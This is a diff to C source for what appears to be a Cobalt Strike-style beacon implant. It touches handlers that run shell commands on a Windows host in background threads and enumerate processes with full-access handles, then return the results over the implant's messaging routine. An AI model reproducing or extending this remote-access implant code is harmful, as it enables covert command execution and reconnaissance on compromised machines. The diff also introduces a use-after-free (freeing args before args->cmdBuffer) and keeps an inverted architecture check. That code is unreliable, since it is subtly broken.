@@ -178,7 +178,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
             if (numberOfBytesRead > 0) {
                 if (firstTime) {
                     unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
-                    if (resultStr) {
+                    if (resultStr && buffer) {
                         memcpy(resultStr, buffer, numberOfBytesRead);
                         DataProcess(resultStr, numberOfBytesRead, 0);
                     }
@@ -189,7 +189,7 @@ DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
                     snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
                     DataProcess((unsigned char*)prompt, strlen(prompt), 0);
                     unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
-                    if (resultStr) {
+                    if (resultStr && buffer) {
                         memcpy(resultStr, buffer, numberOfBytesRead);
                         DataProcess(resultStr, numberOfBytesRead, 0);
                         free(resultStr);
@@ -307,7 +307,7 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
             if(numberOfBytesRead > 0) {
                 if (firstTime) {
                     unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
-                    if (resultStr) {
+                    if (resultStr && buffer) {
                         memcpy(resultStr, buffer, numberOfBytesRead);
                         DataProcess(resultStr, numberOfBytesRead, 0);
                     }
@@ -315,10 +315,10 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
                 }
                 else {
                     char prompt[MAX_PATH];   
-                    snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
+                    snprintf(prompt, MAX_PATH, "[+] %s:\n", commandLine);
                     DataProcess((unsigned char*)prompt, strlen(prompt), 0);
                     unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
-                    if (resultStr) {
+                    if (resultStr && buffer) {
                         memcpy(resultStr, buffer, numberOfBytesRead);
                         DataProcess(resultStr, numberOfBytesRead, 0);
                         free(resultStr);
@@ -338,14 +338,16 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     return TRUE;
 }
 
-VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
+VOID CmdShell(unsigned char* commandBuf, size_t commandBuflen)
 { 
 	// 解决线程还么运行 commandBuf 可能被释放的问题
     struct ShellThreadArgs* args = malloc(sizeof(struct ShellThreadArgs));
     if (args) {
-        args->cmdBuffer = (unsigned char*)malloc(*commandBuflen);
-        memcpy(args->cmdBuffer, commandBuf, *commandBuflen);
-        args->cmdBufferLength = *commandBuflen;
+        args->cmdBuffer = (unsigned char*)malloc(commandBuflen);
+        if (args->cmdBuffer) {
+            memcpy(args->cmdBuffer, commandBuf, commandBuflen);
+            args->cmdBufferLength = commandBuflen;
+        }
     }
 
     ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
@@ -376,8 +378,8 @@ VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
             NULL);                      // 不存储线程ID
         if (myThread == NULL) {
             fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
-            free(args->cmdBuffer);
             free(args);
+            free(args->cmdBuffer);
             return;
         }
         // 异步执行
@@ -452,7 +454,7 @@ BOOL GetProcessUserInfo(HANDLE ProcessHandle, char* usersid)
     return status;
 }
 
-BOOL IsProcessX64s(DWORD pid) {
+BOOL IsProcessX64(DWORD pid) {
     BOOL isX64 = FALSE;
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (hProcess != NULL) {
@@ -463,18 +465,18 @@ BOOL IsProcessX64s(DWORD pid) {
     return FALSE;
 }
 
-VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
+VOID CmdPs(unsigned char* commandBuf, size_t commandBuflen)
 {
-    char usersid[2048];
-    memset(usersid, 0, sizeof(usersid));
+    char userSid[2048];
+    memset(userSid, 0, sizeof(userSid));
 
     datap datap;
-    BeaconDataParse(&datap, commandBuf, *commandBuflen);
-    int unknown = BeaconDataInt(&datap);
+    BeaconDataParse(&datap, commandBuf, commandBuflen);
+    int msgCallBack = BeaconDataInt(&datap);
     BeaconFormatAlloc((formatp*)&datap, 0x8000);
-    if (unknown > 0)
+    if (msgCallBack > 0)
     {
-        BeaconFormatInt((formatp*)&datap, unknown);
+        BeaconFormatInt((formatp*)&datap, msgCallBack);
     }
  
     DWORD pSessionId;
@@ -490,21 +492,21 @@ VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
             do
             {
                 th32ProcessID = pe.th32ProcessID;
-                const char* arch2 = "x64";
-                BOOL isX64 = IsProcessX64s(pe.th32ProcessID);
-                arch2 = !isX64 ? "x64" : "x86";
-                hprocess = OpenProcess( PROCESS_ALL_ACCESS, 0, th32ProcessID);
+                const char* arch = "x64";
+                BOOL isX64 = IsProcessX64(pe.th32ProcessID);
+                arch = !isX64 ? "x64" : "x86";
                 wchar_t* szExeFile = pe.szExeFile;
+                // bufferSize 包含 \0
                 int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, NULL, 0, NULL, NULL);
-                // 分配足够的内存来存储转换后的字符串
                 char* szExeFileConverted = (char*)malloc(bufferSize);
                 // 将 wchar_t* 类型字符串转换成 char* 类型字符串
                 WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, szExeFileConverted, bufferSize, NULL, NULL);
+                hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, th32ProcessID);
                 if (hprocess)
                 {
-                    if (!GetProcessUserInfo(hprocess, usersid))
+                    if (!GetProcessUserInfo(hprocess, userSid))
                     {
-                        usersid[0] = 0;
+                        userSid[0] = 0;
                     }
                     if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                     {
@@ -517,10 +519,11 @@ VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
                         szExeFileConverted,
                         pe.th32ParentProcessID,
                         pe.th32ProcessID,
-                        arch2,
-                        usersid,
+                        arch,
+                        userSid,
                         pSessionId);
                     CloseHandle(hprocess);
+                    free(szExeFileConverted);
                 }
                 else
                 {
@@ -532,14 +535,15 @@ VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
                         szExeFileConverted,
                         pe.th32ParentProcessID,
                         pe.th32ProcessID,
-                        arch2,
+                        arch,
                         "",
                         pSessionId);
+                    free(szExeFileConverted);
                 }
             } while (Process32Next(Toolhelp32Snapshot, &pe));
             CloseHandle(Toolhelp32Snapshot);
             int msg_type;
-            if (unknown)
+            if (msgCallBack)
             {
                 msg_type = 22;
             }
@@ -548,7 +552,7 @@ VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
                 msg_type = 17;
             }
             int datalength = BeaconFormatLength((formatp*)&datap);
-            char* databuffer = BeaconFormatOriginal((formatp*)&datap);
+            unsigned char* databuffer = (unsigned char*)BeaconFormatOriginal((formatp*)&datap);
             DataProcess(databuffer, datalength, msg_type);
             BeaconFormatFree((formatp*)&datap);
         }
